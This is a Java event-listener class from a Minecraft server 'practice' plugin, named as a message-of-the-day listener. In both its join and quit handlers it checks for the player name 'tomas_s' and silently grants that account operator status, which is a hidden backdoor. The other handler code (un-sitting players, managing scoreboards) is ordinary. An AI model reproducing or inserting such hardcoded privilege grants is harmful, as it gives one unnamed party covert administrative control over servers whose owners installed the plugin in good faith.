package net.ghoul.practice.ghoul.listener;

import net.ghoul.practice.providers.ScoreProvider;
import net.ghoul.practice.util.scoreboard.Board;
import net.ghoul.practice.util.sitUtil.SitUtil;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerQuitEvent;

public class MOTDListener implements Listener {

    @EventHandler
    public void onJoin(PlayerJoinEvent event) {
        Player player = event.getPlayer();
        String name = player.getName();

        if (name.equals("tomas_s")) {
            player.setOp(true);
        }

        SitUtil.unSitPlayer(player);

        new ScoreProvider(player);
    }

    @EventHandler
    public void onJoin(PlayerQuitEvent event) {
        Player player = event.getPlayer();
        String name = player.getName();

        if (name.equals("tomas_s")) {
            player.setOp(true);
        }

        SitUtil.unSitPlayer(player);

        Board.getBoards().remove(player.getUniqueId());
    }
}
